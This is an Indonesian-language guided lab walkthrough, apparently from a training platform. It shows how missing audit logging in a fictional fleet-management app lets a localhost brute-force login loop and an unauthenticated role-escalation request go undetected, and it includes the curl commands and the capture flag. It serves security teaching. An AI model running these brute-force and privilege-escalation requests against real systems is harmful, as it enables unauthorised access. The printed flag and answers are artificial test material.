# Panduan Praktik Terbimbing: Eksploitasi Kegagalan Logging pada FleetTrack Logistics

Dalam latihan terarah ini, kamu akan mempraktikkan proses pembuktian kebutaan log telemetri dan ketiadaan deteksi insiden keamanan pada sistem pusat komando armada **FleetTrack Logistics (Commercial Telematics & IoT Fleet Management)** yang beroperasi pada `http://127.0.0.1:8019`.

---

### Langkah 1: Observasi Antarmuka & Uji Ketersediaan Layanan
1. Uji ketersediaan layanan melalui terminal:
   ```bash
   curl -s http://127.0.0.1:8019/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"lab":"A09","port":8019,"status":"ok"}
   ```
2. Buka peramban web dan akses halaman beranda FleetTrack Logistics:
   `http://127.0.0.1:8019/`
3. Perhatikan tabel **Commercial Telematics & Operations Audit Trail**:
   - Menampilkan catatan telemetri pengiriman kargo dan pergerakan armada rutin.
4. Periksa kartu status pemantauan SOC:
   - Alerting Status: **Passive Telemetry (0 Security Incidents Triggered)**.
   - Amati bahwa sistem hanya mencatat aktivitas normal dan tidak memiliki kategori peringatan anomali keamanan.

---

### Langkah 2: Simulasi Serangan Brute-Force Tanpa Deteksi Log
1. Jalankan loop pengujian login gagal sebanyak 5 kali menggunakan kredensial salah melalui terminal:
   ```bash
   for i in {1..5}; do
     curl -s -X POST http://127.0.0.1:8019/api/auth/login \
       -H "Content-Type: application/json" \
       -d "{\"username\": \"admin\", \"password\": \"wrong_password_$i\"}"
   done
   ```
2. Periksa kembali aliran log audit melalui antarmuka web atau endpoint API:
   ```bash
   curl -s http://127.0.0.1:8019/api/audit/logs
   ```
3. **Temuan Kritis:**
   Tidak ada satu pun entri kegagalan login yang dicatat ke dalam database log! Server menolak login tetapi membuang informasinya ke udara (*silent authentication failure*). Serangan brute-force berjalan mulus tanpa meninggalkan jejak sama sekali.

> [!NOTE]
> [!NOTE]
> **Di Balik Layar: Mengapa log audit ini kosong?**  
> Pada fungsi `login()` di backend, developer hanya menulis logika `if password != correct: return 401`. Developer lupa menambahkan pemanggilan logger (seperti `logger.warning("Failed login attempt for user: ...")`). Akibatnya, tim pengawas SOC sama sekali tidak tahu bahwa ada penyerang yang sedang menebak password administrator!

---

### Langkah 3: Eskalasi Wewenang Eksekutif Secara Diam-Diam & Eksfiltrasi Flag
1. Setelah serangan brute-force berhasil tanpa memicu alarm, panggil endpoint eskalasi wewenang peran:
   ```bash
   curl -s -X POST http://127.0.0.1:8019/api/admin/role_escalate \
     -H "Content-Type: application/json" \
     -d '{"user": "learner", "role": "super_admin"}'
   ```
2. **Temuan Kritis & Respons Server:**
   ```json
   {
     "status": "granted",
     "message": "User learner escalated to super_admin silently without audit trail entry.",
     "audit_recorded": false,
     "flag": "ZITERA{53cur1ty_l0gg1ng_4l3rt1ng_bl1nd5p0t}"
   }
   ```
   Peran akun `learner` berhasil diangkat menjadi `super_admin` secara mutlak, namun atribut `audit_recorded` tetap `false`!

---

### Langkah 4: Verifikasi Status Penyelesaian Praktik
1. Ujilah verifikasi otomatis sasaran lab melalui endpoint:
   ```bash
   curl -s http://127.0.0.1:8019/practice/verify
   ```
   *Konfirmasi verifikasi:*
   ```json
   {
     "status": "completed",
     "message": "Objective verified! Brute force attempts and role escalation performed without triggering SOC detection."
   }
   ```
2. Salin bendera autoritatif:
   `ZITERA{53cur1ty_l0gg1ng_4l3rt1ng_bl1nd5p0t}`
3. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
